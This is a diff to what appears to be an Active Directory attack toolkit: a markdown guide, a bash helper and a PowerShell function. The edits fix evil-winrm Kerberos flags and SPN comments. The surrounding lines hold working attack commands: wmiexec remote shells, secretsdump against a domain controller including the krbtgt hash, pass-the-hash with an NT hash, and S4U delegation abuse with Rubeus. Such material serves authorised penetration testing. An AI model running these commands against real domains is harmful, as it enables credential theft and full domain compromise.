@@ -44,12 +44,12 @@ Authenticate with the TGT/TGS (`-k` reads `KRB5CCNAME`, `-no-pass` stops asking 
 smbclient -k -L //WS02.corp.local
 impacket-wmiexec -k -no-pass DOMAIN/USER@WS02.corp.local     # needs the cifs/WS02 TGS; the tool requests it automatically
 impacket-secretsdump -k -no-pass DC01.corp.local             # needs the DC machine ticket; first confirm whose it is
-evil-winrm -i WS02.corp.local -r corp.local                  # Kerberos path; needs a wsman/WS02 TGS and reads KRB5CCNAME
+evil-winrm -i WS02.corp.local -r CORP.LOCAL                  # reads KRB5CCNAME; default SPN is HTTP/WS02.corp.local
 # The ticket's identity has no access to the target service -> use the existing ticket to request another service's TGS
 #    (the key only has to be in the cache; no password needed again. See the ask_tgs function in the script)
 ```
 
-<!-- VERIFY: evil-winrm Kerberos is `-i <FQDN> -r <realm>` and reads KRB5CCNAME. The previous `-k` flag is `--priv-key`, not Kerberos. Confirm against the installed `evil-winrm --help`. -->
+`evil-winrm -r REALM` selects Kerberos; its lowercase `-k` is an SSL private-key path, not a Kerberos switch. Configure the realm/KDC in `/etc/krb5.conf`, use the target FQDN, and supply a valid cache (`KRB5CCNAME`); the default service prefix is `HTTP` (`--spn` overrides it).
 
 `smbclient -k -L //WS02` listing shares / `wmiexec` returning a shell means it worked; `klist` shows the newly issued TGS. If you get `KRB_AP_ERR_MODIFIED`, it is usually a mismatch between the ticket principal and the SPN or enctype, not a network problem.
 
@@ -126,7 +126,7 @@ Arguments:
        tgt       get a TGT with a password/hash (impacket-getTGT, needs -u and -p or -H)
        tgs       request a TGS per service (kvno; or impacket-getST -spn, needs -S)
        auth      hit Windows services with an existing ticket: the full smbclient/wmiexec/psexec/smbexec/
-                 secretsdump/evil-winrm -k command set (needs -d and -t)
+                 secretsdump -k / evil-winrm -r command set (needs -d and -t)
        cross     print the Linux -> Windows cross-domain (subdomain->forest root) steps and prerequisites
        all       info + krb5conf + hosts + auth (cold-start one-shot)
   -d <fqdn>   domain FQDN (DOMAIN), required for most modes
@@ -466,8 +466,8 @@ mode_auth() {
     run impacket-secretsdump -k -no-pass "$DC"
     run impacket-secretsdump -k -no-pass -just-dc-user krbtgt "$DC"
     echo
-    echo "# 4) WinRM (needs a wsman/TARGET TGS)"
-    run evil-winrm -i "$TGT_HOST" -r "$DOMAIN" -k
+    echo "# 4) WinRM (default SPN HTTP/TARGET; cache needs a usable TGT or matching TGS)"
+    run evil-winrm -i "$TGT_HOST" -r "$DOMAIN"
     echo
     info "If you have no -k but do have a domain user password/hash (for comparison):"
     echo "impacket-wmiexec $DOMAIN/USER@$TGT_HOST -hashes :NTHASH"
@@ -1368,7 +1368,7 @@ function Show-M12dS4uCommands {
     Write-Output ""
     Write-Output "[C] How to validate when the delegation list only holds a service class such as http/:"
     Write-Output "    curl --negotiate -u : http://TARGET/      (SPN is http/TARGET)"
-    Write-Output "    evil-winrm -i TARGET -r DOMAIN             (SPN is wsman/TARGET)"
+    Write-Output "    evil-winrm -i TARGET -r DOMAIN             (default SPN is HTTP/TARGET)"
 
     if ($Execute -and (Test-Path (Join-Path $script:ToolDir 'Rubeus.exe'))) {
         Write-Output ""
